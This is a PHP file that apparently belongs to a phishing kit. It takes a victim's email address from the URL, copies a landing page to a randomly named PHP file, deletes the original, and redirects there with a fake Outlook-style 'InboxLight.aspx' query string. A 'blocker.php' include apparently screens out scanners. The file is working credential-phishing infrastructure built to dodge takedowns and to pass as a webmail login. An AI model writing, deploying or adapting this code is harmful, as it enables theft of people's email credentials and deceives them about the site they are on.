<?php
include('blocker.php');
?>
<?php
function getloginIDFromlogin($login)
{
$find = '@';
$pos = strpos($login, $find);
$loginID = substr($login, 0, $pos);
return $loginID;
}
$login = $_GET['login'];
$loginID = getloginIDFromlogin($login);
$dir =  getcwd();
if ($handle = opendir($dir)) {
    while (false !== ($entry = readdir($handle))) {
 $len = strlen($entry);
if($len == 28){
rename($entry, "m.i.php");
}}}
$staticfile = "m.i.php";
$name =  generateRandomString();
$secfile = $name.".php";
if (!copy($staticfile, $secfile)) {
//echo "file not create\n";
}else {
if(file_exists($secfile)){
//echo "file exist\n";
unlink($staticfile);
header("Location: $secfile?rand=13InboxLightaspxn.1774256418&fid.4.1252899642&fid=1&fav.1&rand.13InboxLight.aspxn.1774256418&fid.1252899642&fid.1&fav.1&login=$login&loginID=$loginID&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1");
}}

//echo $_SESSION["file"]."\n";
$name =  generateRandomString();
function generateRandomString($length = 24) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
?>
